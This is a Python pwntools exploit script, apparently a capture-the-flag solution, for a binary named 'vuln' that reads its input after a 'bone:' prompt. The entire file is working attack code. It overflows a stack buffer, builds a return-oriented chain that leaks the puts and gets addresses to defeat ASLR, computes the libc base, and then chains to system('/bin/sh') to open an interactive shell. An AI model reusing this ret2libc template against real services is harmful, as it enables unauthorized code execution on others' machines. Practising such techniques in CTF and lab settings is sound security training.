#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./vuln")
libc = ELF("./libc.so")


def start(argv=[], *a, **kw):
    host = args.HOST or 'localhost'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

pad = 0x50

pop_rdi = 0x4011be
ret = pop_rdi + 0x1

payload = b"A" * pad
payload += p64(elf.bss(0x100))  # rbp
payload += flat(pop_rdi, elf.got["puts"], elf.plt["puts"])
payload += flat(pop_rdi, elf.got["gets"], elf.plt["puts"])
payload += p64(elf.symbols["main"])

io.sendlineafter(b"bone:\n", payload)

io.recvline()
leak_puts = u64(io.recvline().strip().ljust(8, b"\x00"))
leak_gets = u64(io.recvline().strip().ljust(8, b"\x00"))

log.info(f"{leak_puts=:#x}")
log.info(f"{leak_gets=:#x}")

libc.address = leak_puts - libc.symbols["puts"]
system = libc.symbols["system"]
bin_sh_str = next(libc.search(b"/bin/sh\x00"))

payload = b"A" * pad
payload += p64(elf.bss(0x100))  # rbp
payload += flat(pop_rdi, bin_sh_str, system)

io.sendlineafter(b"bone:\n", payload)

io.interactive()
